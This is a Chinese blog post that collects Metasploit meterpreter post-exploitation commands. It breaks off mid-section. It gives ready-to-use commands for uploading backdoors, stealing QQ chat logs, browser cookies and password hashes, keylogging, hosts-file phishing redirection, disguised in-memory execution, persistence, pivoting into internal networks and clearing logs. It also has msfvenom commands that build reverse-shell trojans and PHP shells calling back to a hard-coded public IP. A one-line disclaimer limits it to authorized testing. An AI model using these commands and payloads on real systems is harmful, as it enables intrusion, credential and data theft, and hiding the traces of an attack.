<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>meterpreter会话渗透利用常用命令归纳小结 | Putdownd’s Blog</title><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="仅作渗透测试技术实验之用，请勿针对任何未授权网络和设备。 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ssooking&#x2F;p&#x2F;6192995.html run vnc 无法操作的远程桌面 常用的32个命令归纳小结1、background命令返回，把meterpreter后台挂起 2、session命令session 命令可以查看已经成功获取的会话 可以使用session -i 连接到指定序号的m">
<meta property="og:type" content="article">
<meta property="og:title" content="meterpreter会话渗透利用常用命令归纳小结">
<meta property="og:url" content="https://blog.putdown.top/archives/def7eeeb.html">
<meta property="og:site_name" content="Putdownd’s Blog">
<meta property="og:description" content="仅作渗透测试技术实验之用，请勿针对任何未授权网络和设备。 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ssooking&#x2F;p&#x2F;6192995.html run vnc 无法操作的远程桌面 常用的32个命令归纳小结1、background命令返回，把meterpreter后台挂起 2、session命令session 命令可以查看已经成功获取的会话 可以使用session -i 连接到指定序号的m">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.putdown.top/img/e5925563a436d850cfc6184421b9ec77.jpeg">
<meta property="article:published_time" content="2022-09-27T10:06:09.000Z">
<meta property="article:modified_time" content="2023-11-17T07:58:13.000Z">
<meta property="article:author" content="putdown">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.putdown.top/img/e5925563a436d850cfc6184421b9ec77.jpeg"><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/archives/def7eeeb"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'meterpreter会话渗透利用常用命令归纳小结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-17 07:58:13'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">115</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Putdownd’s Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">meterpreter会话渗透利用常用命令归纳小结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-27T10:06:09.000Z" title="发表于 2022-09-27 10:06:09">2022-09-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-17T07:58:13.000Z" title="更新于 2023-11-17 07:58:13">2023-11-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="meterpreter会话渗透利用常用命令归纳小结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>仅作渗透测试技术实验之用，请勿针对任何未授权网络和设备。</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/ssooking/p/6192995.html">https://www.cnblogs.com/ssooking/p/6192995.html</a></p>
<p>run vnc 无法操作的远程桌面</p>
<h1 id="常用的32个命令归纳小结"><a href="#常用的32个命令归纳小结" class="headerlink" title="常用的32个命令归纳小结"></a>常用的32个命令归纳小结</h1><h2 id="1、background命令"><a href="#1、background命令" class="headerlink" title="1、background命令"></a>1、background命令</h2><p>返回，把meterpreter后台挂起</p>
<h2 id="2、session命令"><a href="#2、session命令" class="headerlink" title="2、session命令"></a>2、session命令</h2><p>session 命令可以查看已经成功获取的会话</p>
<p>可以使用session -i 连接到指定序号的meterpreter会话已继续利用</p>
<h2 id="3、shell命令"><a href="#3、shell命令" class="headerlink" title="3、shell命令"></a>3、shell命令</h2><p>获取目标主机的远程命令行shell</p>
<p>如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试</p>
<h2 id="4、cat命令"><a href="#4、cat命令" class="headerlink" title="4、cat命令"></a>4、cat命令</h2><p>查看目标主机上的文档内容</p>
<p>例如：cat  C:\\boot.ini 查看目标主机启动引导信息</p>
<h2 id="5、getwd命令"><a href="#5、getwd命令" class="headerlink" title="5、getwd命令"></a>5、getwd命令</h2><p>获取系统工作的当前目录</p>
<h2 id="6、upload命令"><a href="#6、upload命令" class="headerlink" title="6、upload命令"></a>6、upload命令</h2><p>上传文件到目标主机，例如把后门程序setup.exe传到目标主机system32目录下</p>
<p>upload  setup.exe  C:\\windows\\system32\</p>
<h2 id="7、download命令"><a href="#7、download命令" class="headerlink" title="7、download命令"></a>7、download命令</h2><p>把目标主机上的文件下载到我们的攻击主机上</p>
<p>例如：把目标主机C盘根目录下的boot.ini文件下载到攻击主机的&#x2F;root&#x2F;目录下</p>
<p>download C:\\boot.ini &#x2F;root&#x2F;</p>
<p>download C:\\“Program Files”\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db &#x2F;root&#x2F;</p>
<p>把目标主机上的QQ聊天记录下载到攻击主机的root目录下（仅实验用途，是否要考虑变更你QQ程序的安装路径了呢）  </p>
<h2 id="8、edit命令"><a href="#8、edit命令" class="headerlink" title="8、edit命令"></a>8、edit命令</h2><p>调用vi编辑器，对目标主机上的文件修改</p>
<p>例如修改目标主机上的hosts文件，使得目标主机访问baidu时去到准备好的钓鱼网站（仅限实验用途）</p>
<p>在目标主机上ping <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.baidu.com,出来的目标ip就是我们修改的192.168.1.1了/">www.baidu.com，出来的目标IP就是我们修改的192.168.1.1了</a>  </p>
<h2 id="9、search命令"><a href="#9、search命令" class="headerlink" title="9、search命令"></a>9、search命令</h2><p>在目标主机文件系统上查找搜索文件</p>
<p>例如：search  -d  c:\\  -f  *.doc</p>
<p>在目标主机C盘下搜索doc文档</p>
<h2 id="10、ipconfig命令"><a href="#10、ipconfig命令" class="headerlink" title="10、ipconfig命令"></a>10、ipconfig命令</h2><p>这个不多说，查看目标主机上的网络参数</p>
<h2 id="11、portfwd命令"><a href="#11、portfwd命令" class="headerlink" title="11、portfwd命令"></a>11、portfwd命令</h2><p>端口转发</p>
<p>例如目标主机上开启了3389，但是只允许特定IP访问，攻击主机无法连接，可以使用portfwd命令把目标主机的3389端口转发到其他端口打开</p>
<p>例如：portfwd  add -l  1122 -p 3389 -r  192.168.250.176</p>
<p>把目标主机192.168.250.176的3389端口转发到1122端口<br>这是只需要连接目标的1122端口就可以打开远程桌面了</p>
<p>rdesktop  -u  administrator  -p  123456  192.168.250.176:1122</p>
<h2 id="12、route命令"><a href="#12、route命令" class="headerlink" title="12、route命令"></a>12、route命令</h2><p>这个也不多说，显示目标主机上的主机路由表</p>
<h2 id="13、getuid"><a href="#13、getuid" class="headerlink" title="13、getuid"></a>13、getuid</h2><p>查看meterpreter注入到目标主机的进程所属用户</p>
<h2 id="14、sysinfo"><a href="#14、sysinfo" class="headerlink" title="14、sysinfo"></a>14、sysinfo</h2><p>查看目标主机系统信息</p>
<h2 id="15、ps命令"><a href="#15、ps命令" class="headerlink" title="15、ps命令"></a>15、ps命令</h2><p>查看目标主机上运行的进程信息，结合migrate使用</p>
<h2 id="16、migrate"><a href="#16、migrate" class="headerlink" title="16、migrate"></a>16、migrate</h2><p>将meterpreter会话移植到另一个进程</p>
<p>例如反弹的meterpreter会话是对方打开了一个你预置特殊代码的word文档而产生的，那么对方一旦关闭掉该word文档，我们获取到的meterpreter会话就会随之关闭，所以把会话进程注入到explorer.exe是一个好方法</p>
<p>可以先用ps命令看一下目标主机的explorer.exe进程的pid</p>
<p>是1668</p>
<p>然后我们用migrate 1668 把meterpreter会话注入进去</p>
<h2 id="17、execute命令"><a href="#17、execute命令" class="headerlink" title="17、execute命令"></a>17、execute命令</h2><p>在目标主机上运行某个程序</p>
<p>例如我们目前注入进程到explorer.exe后，运行用户为超级管理员administrator</p>
<p>我们运行一下目标主机上的记事本程序</p>
<p>execute  -f  notepad.exe</p>
<p>目标主机上立马弹出来一个记事本程序，如下图：  </p>
<p>这样太明显，如果希望隐藏后台执行，加参数-H</p>
<p>execute  -H -f  notepad.exe</p>
<p>此时目标主机桌面没反应，但我们在meterpreter会话上使用ps命令看到了</p>
<p>再看一个，我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上</p>
<p>命令：</p>
<p>execute  -H -i -f  cmd.exe</p>
<p>这达到的效果就跟使用shell命令一样了</p>
<p>再来一个，在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。</p>
<p>execute  -H -m -d notepad.exe -f  wce.exe -a “-o  wce.txt”</p>
<p>-d 在目标主机执行时显示的进程名称（用以伪装）</p>
<p>-m 直接从内存中执行</p>
<p> “-o  wce.txt”是wce.exe的运行参数</p>
<h2 id="18、getpid"><a href="#18、getpid" class="headerlink" title="18、getpid"></a>18、getpid</h2><p>获取meterpreter会话在目标主机上注入进程的进程号</p>
<h2 id="19、shutdown命令"><a href="#19、shutdown命令" class="headerlink" title="19、shutdown命令"></a>19、shutdown命令</h2><p>关闭目标主机</p>
<h2 id="20、后渗透模块post-x2F-windows-x2F-gather-x2F-forensics-x2F-enum-drives调用"><a href="#20、后渗透模块post-x2F-windows-x2F-gather-x2F-forensics-x2F-enum-drives调用" class="headerlink" title="20、后渗透模块post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives调用"></a>20、后渗透模块post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives调用</h2><p>在获取meterpreter会话session后，调用post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives，可获取目标主机存储器信息：</p>
<p>命令，在msfconsole下：</p>
<p>use post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives</p>
<p>set SESSION 1</p>
<p>exploit</p>
<p>效果如图：</p>
<p>或直接在meterpreter会话中以命令run  post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives调用  </p>
<h2 id="21、调用post-x2F-windows-x2F-gather-x2F-checkvm后渗透模块，确定目标主机是否是一台虚拟机"><a href="#21、调用post-x2F-windows-x2F-gather-x2F-checkvm后渗透模块，确定目标主机是否是一台虚拟机" class="headerlink" title="21、调用post&#x2F;windows&#x2F;gather&#x2F;checkvm后渗透模块，确定目标主机是否是一台虚拟机"></a>21、调用post&#x2F;windows&#x2F;gather&#x2F;checkvm后渗透模块，确定目标主机是否是一台虚拟机</h2><p>命令：</p>
<p>run  post&#x2F;windows&#x2F;gather&#x2F;checkvm</p>
<p>效果如下图：</p>
<h2 id="22、persistence后渗透模块向目标主机植入后门程序"><a href="#22、persistence后渗透模块向目标主机植入后门程序" class="headerlink" title="22、persistence后渗透模块向目标主机植入后门程序"></a>22、persistence后渗透模块向目标主机植入后门程序</h2><p>命令：</p>
<p>run  persistence -X  -i  5  -p 4444  -r 172.17.11.18 </p>
<p>-X 在目标主机上开机自启动</p>
<p>-i  不断尝试反向连接的时间间隔</p>
<p>效果如下图：</p>
<p>执行过程：</p>
<p>创建攻击载荷-&gt;攻击载荷植入到目标主机c:\windows\temp目录下，是一个.vbs的脚本-&gt;写目标主机注册表键值实现开机自动运行。<br>下图，在攻击主机上监听4444端口，等待反弹会话成功</p>
<p>下图，看目标主机注册表Run键值果然被写入了一个pDTizIlNK的键值，执行后门vbs脚本  </p>
<h2 id="23、调用metsvc后渗透攻击模块"><a href="#23、调用metsvc后渗透攻击模块" class="headerlink" title="23、调用metsvc后渗透攻击模块"></a>23、调用metsvc后渗透攻击模块</h2><p>命令：run  metsvc</p>
<p>效果如下图：</p>
<p>执行过程：在目标主机上创建一个监听31337端口的服务-&gt;在目标主机c:\windows\temp\下创建一个存放后门服务有关文件程序的目录，并上传metsrv.x86.dll、metsvc-server.exe、metsvc.exe三个文件到该目录下-&gt;开启服务</p>
<p>成功后：在目标主机上看到31337号端口已开，且服务多了一个meterpreter(如下图)  </p>
<h2 id="24、调用getgui后渗透攻击模块"><a href="#24、调用getgui后渗透攻击模块" class="headerlink" title="24、调用getgui后渗透攻击模块"></a>24、调用getgui后渗透攻击模块</h2><p>作用：开启目标主机远程桌面，并可添加管理员组账号</p>
<p>命令：</p>
<p>run  getgui  -e</p>
<p>开启目标主机远程桌面</p>
<p>如下图：</p>
<p>开启目标主机的远程桌面服务后，可以添加账号以便利用</p>
<p>命令：</p>
<p>run  getgui  -u  example_username  -p  example_password</p>
<p>如下图：  </p>
<p>执行成功，可以使用kali的rdesktop命令使用远程桌面连接目标主机</p>
<p>rdesktop  -u  kali  -p  meterpreter  192.168.250.176:3389  </p>
<h2 id="25、提权命令getsystem"><a href="#25、提权命令getsystem" class="headerlink" title="25、提权命令getsystem"></a>25、提权命令getsystem</h2><p>使用getsystem提升当前进城执行账户微system用户，拿到系统最高权限</p>
<p>命令：getsystem</p>
<h2 id="26、键盘记录器功能keyscan"><a href="#26、键盘记录器功能keyscan" class="headerlink" title="26、键盘记录器功能keyscan"></a>26、键盘记录器功能keyscan</h2><p>命令：</p>
<p>keyscan_start   开启记录目标主机的键盘输入</p>
<p>keyscan_dump   输出截获到的目标键盘输入字符信息</p>
<p>keyscan_stop     停止键盘记录</p>
<p>效果如下图：</p>
<p>箭头所指为截获到目标主机的键盘输入字符</p>
<h2 id="27、系统账号密码获取"><a href="#27、系统账号密码获取" class="headerlink" title="27、系统账号密码获取"></a>27、系统账号密码获取</h2><p>命令：hashdump</p>
<p>在获得system权限的情况下，使用hashdump命令可以到处目标主机的SAM文件，获取目标主机的账号密码hash信息，剩下的可以用爆破软件算出明文密码</p>
<p>效果如图：</p>
<h2 id="28、调用post-x2F-windows-x2F-gather-x2F-enum-applications模块获取目标主机上的软件安装信息"><a href="#28、调用post-x2F-windows-x2F-gather-x2F-enum-applications模块获取目标主机上的软件安装信息" class="headerlink" title="28、调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块获取目标主机上的软件安装信息"></a>28、调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块获取目标主机上的软件安装信息</h2><p>命令：run  post&#x2F;windows&#x2F;gather&#x2F;enum_applications</p>
<p>效果如图：</p>
<h2 id="29、调用post-x2F-windows-x2F-gather-x2F-dumplinks获取目标主机上最近访问过的文档、链接信息"><a href="#29、调用post-x2F-windows-x2F-gather-x2F-dumplinks获取目标主机上最近访问过的文档、链接信息" class="headerlink" title="29、调用post&#x2F;windows&#x2F;gather&#x2F;dumplinks获取目标主机上最近访问过的文档、链接信息"></a>29、调用post&#x2F;windows&#x2F;gather&#x2F;dumplinks获取目标主机上最近访问过的文档、链接信息</h2><p>命令：run  post&#x2F;windows&#x2F;gather&#x2F;dumplinks</p>
<p>效果如下图：</p>
<h2 id="30、调用post-x2F-windows-x2F-gather-x2F-enum-ie后渗透模块，读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码"><a href="#30、调用post-x2F-windows-x2F-gather-x2F-enum-ie后渗透模块，读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码" class="headerlink" title="30、调用post&#x2F;windows&#x2F;gather&#x2F;enum_ie后渗透模块，读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码"></a>30、调用post&#x2F;windows&#x2F;gather&#x2F;enum_ie后渗透模块，读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码</h2><p>命令：run  post&#x2F;windows&#x2F;gather&#x2F;enum_ie</p>
<p>效果如下图：</p>
<p>获取到的目标主机上的ie浏览器缓存历史记录和cookies信息等都保存到了攻击主机本地的&#x2F;root&#x2F;.msf5&#x2F;loot&#x2F;目录下。</p>
<h2 id="31、route命令"><a href="#31、route命令" class="headerlink" title="31、route命令"></a>31、route命令</h2><p>使用route命令可以借助meterpreter会话进一步msf渗透内网，我们已经拿下并产生meterpreter反弹会话的主机可能出于内网之中，外有一层NAT，我们无法直接向其内网中其他主机发起攻击，则可以借助已产生的meterpreter会话作为路由跳板，攻击内网其它主机。</p>
<p>可以先使用run  get_local_subnets命令查看已拿下的目标主机的内网IP段情况</p>
<p>命令：run  get_local_subnets</p>
<p>如下图：</p>
<p>其内网尚有192.168.249.0&#x2F;24网段，我们无法直接访问</p>
<p>下面做一条路由，下一跳为当前拿下主机的session id（目前为5），即所有对249网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递。</p>
<p>命令：route add  192.168.249.0 255.255.255.0 5</p>
<p>再使用route print查看一下路由表，效果如下图：</p>
<p>最后我们就可以通过这条路由，以当前拿下的主机meterpreter作为路由跳板攻击249网段中另一台有ms08-067漏洞的主机，获得反弹会话成功顺利拿下了另一台内网主机192.168.249.1，如下图：</p>
<h2 id="32、clearev命令"><a href="#32、clearev命令" class="headerlink" title="32、clearev命令"></a>32、clearev命令</h2><p>入侵痕迹擦除</p>
<p>在渗透利用过程中难免留下日志等信息痕迹，使用clearev命令擦除痕迹后再跑。</p>
<p>命令：clearev</p>
<p>效果如下图：</p>
<p>msf &gt; help</p>
<p>db_autopwn Commands<br>===================</p>
<pre><code>Command       Description
\-------       -----------
db\_autopwn    Automatically exploit everything
</code></pre>
<p>Core Commands<br>=============</p>
<pre><code>Command       Description
\-------       -----------
?             Help menu
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
exit          Exit the console
get           Gets the value of a context\-specific variable
getg          Gets the value of a global variable
grep          Grep the output of another command
help          Help menu
history       Show command history
irb           Drop into irb scripting mode
load          Load a framework plugin
quit          Exit the console
route         Route traffic through a session
save          Saves the active datastores
sessions      Dump session listings and display information about sessions
set           Sets a context\-specific variable to a value
setg          Sets a global variable to a value
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context\-specific variables
unsetg        Unsets one or more global variables
version       Show the framework and console library version numbers
</code></pre>
<p>Module Commands<br>===============</p>
<pre><code>Command       Description
\-------       -----------
advanced      Displays advanced options for one or more modules
back          Move back from the current context
edit          Edit the current module or a file with the preferred editor
info          Displays information about one or more modules
loadpath      Searches for and loads modules from a path
options       Displays global options or for one or more modules
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
reload\_all    Reloads all modules from all defined module paths
search        Searches module names and descriptions
show          Displays modules of a given type, or all modules
use           Selects a module by name
</code></pre>
<p>Job Commands<br>============</p>
<pre><code>Command       Description
\-------       -----------
handler       Start a payload handler as job
jobs          Displays and manages jobs
kill          Kill a job
rename\_job    Rename a job
</code></pre>
<p>Resource Script Commands<br>========================</p>
<pre><code>Command       Description
\-------       -----------
makerc        Save commands entered since start to a file
resource      Run the commands stored in a file
</code></pre>
<p>Database Backend Commands<br>=========================</p>
<pre><code>Command           Description
\-------           -----------
db\_connect        Connect to an existing database
db\_disconnect     Disconnect from the current database instance
db\_export         Export a file containing the contents of the database
db\_import         Import a scan result file (filetype will be auto\-detected)
db\_nmap           Executes nmap and records the output automatically
db\_rebuild\_cache  Rebuilds the database\-stored module cache
db\_status         Show the current database status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces
</code></pre>
<p>Credentials Backend Commands<br>============================</p>
<pre><code>Command       Description
\-------       -----------
creds         List all credentials in the database
</code></pre>
<p>msf &gt; </p>
<h1 id="payload的几个常用生成"><a href="#payload的几个常用生成" class="headerlink" title="payload的几个常用生成"></a>payload的几个常用生成</h1><ol>
<li><p>生成windows下的反弹木马</p>
<blockquote>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;60.205.212.140 LPORT&#x3D;8888 -f exe &gt; 8888.exe<br>&#x2F;&#x2F; -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; &#x3D; &gt;</p>
</blockquote>
</li>
<li><p>监听</p>
<blockquote>
<p>use exploit&#x2F;multi&#x2F;handler<br>set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 172.17.150.246 &#x2F;&#x2F;阿里云云服务器这里是内网ip<br>set LPORT 8888<br>exploit -j</p>
</blockquote>
</li>
<li><p>PHP：</p>
<blockquote>
<p>msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;60.205.212.140 LPORT&#x3D;8888 -f raw &gt; shell.php<br>use exploit&#x2F;multi&#x2F;handler<br>set PAYLOAD php&#x2F;meterpreter_reverse_tcp<br>set LHOST 172.17.150.246<br>set LPORT 8888<br>exploit -j</p>
</blockquote>
</li>
<li><p>shellcode：</p>
<blockquote>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LPORT&#x3D;1234 LHOST&#x3D;60.205.212.140 -e x86&#x2F;shikata_ga_nai -i 11 -f py &gt; 1.py &#x2F;&#x2F;-e 使用编码 -i 编码次数</p>
</blockquote>
</li>
</ol>
<hr>
<h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><ol>
<li><p>首先需要链接sessions,在此基础下添加路由</p>
<blockquote>
<p>meterpreter &gt; run get_local_subnets &#x2F;&#x2F;获取网段<br>meterpreter &gt; run autoroute -s 172.2.175.0&#x2F;24 &#x2F;&#x2F;添加路由<br>meterpreter &gt; run autoroute -p &#x2F;&#x2F;查看路由<br>meterpreter &gt; run autoroute -d -s 172.2.175.0 &#x2F;&#x2F;删除网段<br>meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;7.7.7.0&#x2F;24 &#x2F;&#x2F;探测该网段下的存活主机。<br>meterpreter &gt; background &#x2F;&#x2F;后台sessions</p>
</blockquote>
</li>
</ol>
<hr>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ol>
<li><p>getsystem</p>
<blockquote>
<p>meterpreter &gt; getsystem &#x2F;&#x2F;直getsystem提权，最常用简单的办法</p>
</blockquote>
</li>
<li><p>使用exp提权</p>
<blockquote>
<p>meterpreter &gt; background &#x2F;&#x2F;先后台运行会话<br>[*] Backgrounding session 1…<br>msf &gt; use post&#x2F;windows&#x2F;escalate&#x2F;ms10_073_kbdlayout<br>msf &gt; show options<br>msf &gt; set session 1 &#x2F;&#x2F;设置要使用的会话<br>msf post(ms10_073_kbdlayout) &gt; exploit<br>注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。<br>或者直接：<br>meterpreter &gt; run post&#x2F;windows&#x2F;escalate&#x2F;ms10_073_kbdlayout</p>
</blockquote>
</li>
<li><p>盗取令牌</p>
</li>
</ol>
<blockquote>
